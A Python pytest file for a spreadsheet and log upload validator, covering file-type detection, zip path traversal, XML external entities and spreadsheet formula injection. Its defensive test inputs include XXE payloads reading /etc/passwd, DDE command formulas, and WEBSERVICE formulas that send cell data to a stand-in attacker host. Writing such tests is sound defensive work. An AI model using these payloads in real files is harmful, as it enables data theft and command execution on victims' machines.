"""Upload content checks: type by content, risky Excel features, formula injection. Pure functions, no I/O."""
import io
import zipfile
from pathlib import Path

import pandas as pd
import pytest

from backend import filecheck
from backend.filecheck import formula_warnings, inspect_upload

DATA = Path(__file__).resolve().parents[2] / "sample_data"
XLSX = (DATA / "SOC_L2_Logs_Ampliados_Multiples_Incidentes.xlsx").read_bytes()


def with_parts(extra: dict[str, bytes], drop: tuple[str, ...] = ()) -> bytes:
    """The sample workbook plus (or minus) some zip parts."""
    src = zipfile.ZipFile(io.BytesIO(XLSX))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for info in src.infolist():
            if info.filename not in drop:
                z.writestr(info.filename, src.read(info.filename))
        for name, body in extra.items():
            z.writestr(name, body)
    return out.getvalue()


# ---- real type decided by content ---------------------------------------------------------------

def test_sample_files_pass_clean():
    for name in ("SOC_L2_Logs_Ampliados_Multiples_Incidentes.xlsx", "SOC_L2_Logs_Ampliados_Multiples_Incidentes.csv",
                 "SOC_L2_Logs_Ampliados_Multiples_Incidentes.ndjson"):
        r = inspect_upload((DATA / name).read_bytes(), name)
        assert r.reject is None and r.warnings == []


@pytest.mark.parametrize("payload,label", [
    (b"MZ\x90\x00\x03" + b"\x00" * 40, "ejecutable de Windows"),
    (b"\x7fELF\x02\x01\x01" + b"\x00" * 40, "ejecutable de Linux"),
    (b"%PDF-1.7\n1 0 obj", "PDF"),
    (b"\x1f\x8b\x08\x00" + b"\x00" * 20, "gzip"),
    (b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "imagen"),
])
def test_binary_disguised_as_excel_is_rejected_with_its_real_type(payload, label):
    r = inspect_upload(payload, "informe.xlsx")
    assert r.reject and label in r.reject


@pytest.mark.parametrize("name", ["logs.csv", "logs.txt", "logs.json", "logs.ndjson", "logs.log"])
def test_executable_disguised_as_text_export_is_rejected(name):
    r = inspect_upload(b"MZ\x90\x00" + b"\x00" * 40, name)
    assert r.reject and "ejecutable de Windows" in r.reject


def test_zip_renamed_to_csv_is_rejected():
    assert "ZIP" in inspect_upload(XLSX, "datos.csv").reject


def test_legacy_xls_is_rejected_with_a_helpful_message():
    r = inspect_upload(bytes.fromhex("D0CF11E0A1B11AE1") + b"\x00" * 50, "viejo.xlsx")
    assert r.reject and ".xls" in r.reject and "CSV" in r.reject


def test_plain_text_renamed_to_xlsx_is_rejected():
    assert inspect_upload(b"Log_ID,Timestamp\nE1,2026-10-23", "x.xlsx").reject


def test_a_zip_that_is_not_a_workbook_is_rejected():
    docx_like = with_parts({}, drop=("xl/workbook.xml",))
    assert "no un libro de Excel" in inspect_upload(docx_like, "x.xlsx").reject


def test_corrupt_zip_is_rejected_without_crashing():
    assert inspect_upload(b"PK\x03\x04" + b"garbage" * 10, "x.xlsx").reject


# ---- hostile structure ----------------------------------------------------------------------------

@pytest.mark.parametrize("evil", ["../evil.txt", "/etc/cron.d/x", "a/../../b.xml", "..\\win.ini"])
def test_path_traversal_entry_names_are_rejected(evil):
    assert "rutas internas sospechosas" in inspect_upload(with_parts({evil: b"x"}), "x.xlsx").reject


def test_too_many_zip_entries_are_rejected(monkeypatch):
    monkeypatch.setattr(filecheck, "MAX_ZIP_ENTRIES", 3)
    assert "demasiadas partes" in inspect_upload(XLSX, "x.xlsx").reject


@pytest.mark.parametrize("decl", [
    b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><x>&a;</x>',
    b'<?xml version="1.0"?><!doctype x SYSTEM "http://evil.example/x.dtd"><x/>',
    b'<?xml version="1.0"?><!ENTITY xxe SYSTEM "file:///etc/passwd"><x/>',
])
def test_xml_with_doctype_or_entity_is_rejected(decl):
    assert "DOCTYPE/ENTITY" in inspect_upload(with_parts({"xl/extra.xml": decl}), "x.xlsx").reject


# ---- risky but legitimate features: warn, do not block ---------------------------------------------

@pytest.mark.parametrize("part,needle", [
    ("xl/vbaProject.bin", "macros VBA"),
    ("xl/embeddings/oleObject1.bin", "objetos incrustados"),
    ("xl/externalLinks/externalLink1.xml", "vínculos a libros externos"),
    ("xl/connections.xml", "conexiones de datos"),
    ("xl/queryTables/queryTable1.xml", "consultas de datos"),
    ("xl/activeX/activeX1.xml", "ActiveX"),
])
def test_risky_workbook_features_are_reported_but_not_blocked(part, needle):
    r = inspect_upload(with_parts({part: b"<x/>" if part.endswith(".xml") else b"\x00\x01"}), "libro.xlsm")
    assert r.reject is None
    assert any(needle in w for w in r.warnings)
    assert all("no lo ejecuta" in w for w in r.warnings)


# ---- formula injection ---------------------------------------------------------------------------------

def _df(*values):
    return pd.DataFrame({"User": list(values), "Hostname": ["H"] * len(values)})


@pytest.mark.parametrize("cell", [
    '=HYPERLINK("http://evil.example","clic")',
    "=cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    '@SUM(1+1)*cmd|" /c calc"!A0',
    "+WEBSERVICE(\"http://evil.example/?d=\"&A1)",
    "=IMPORTXML(\"http://evil.example\",\"//a\")",
    "\t=HYPERLINK(\"http://evil.example\")",
])
def test_formula_injection_is_reported(cell):
    w = formula_warnings(_df(cell, "alice"))
    assert len(w) == 1 and "1 celda(s)" in w[0] and "inyección de fórmulas" in w[0]


@pytest.mark.parametrize("cell", ["-", "-5", "+54 11 5555-1234", "=1+1", "@alice", "-NoP -W hidden powershell", "cmd.exe /c whoami", "alice", ""])
def test_ordinary_log_values_do_not_trigger_formula_warnings(cell):
    assert formula_warnings(_df(cell)) == []


def test_formula_warning_counts_every_cell():
    w = formula_warnings(_df('=HYPERLINK("a")', '=HYPERLINK("b")', "ok"))
    assert "2 celda(s)" in w[0]


def test_numeric_columns_are_ignored():
    assert formula_warnings(pd.DataFrame({"n": [1, 2, 3]})) == []
